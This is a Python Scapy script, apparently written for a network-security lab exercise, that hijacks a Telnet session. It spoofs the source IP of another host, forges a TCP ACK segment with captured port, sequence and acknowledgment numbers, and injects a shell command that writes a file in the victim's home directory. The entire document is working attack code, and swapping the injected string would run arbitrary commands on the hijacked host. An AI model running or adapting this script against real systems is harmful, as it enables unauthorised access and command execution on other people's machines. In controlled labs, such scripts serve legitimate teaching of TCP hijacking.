#!/usr/bin/env python3
from scapy.all import *

# Craft IP header - spoof source as User1
ip = IP(src="10.9.0.6", dst="10.9.0.5")

# Craft TCP header with captured values
tcp = TCP(sport=57192,           # source port
          dport=23,              # Telnet port
          flags="A",             # ACK flag (data transfer)
          seq=1094771494,        # next sequence number
          ack=3094329772)        # acknowledgment number

# The malicious command to inject
data = 'echo "you are hacked" > ~/hacked.txt\n'

# Combine layers into a packet
pkt = ip/tcp/data

# Display packet structure
ls(pkt)

# Send the packet
send(pkt, verbose=0)
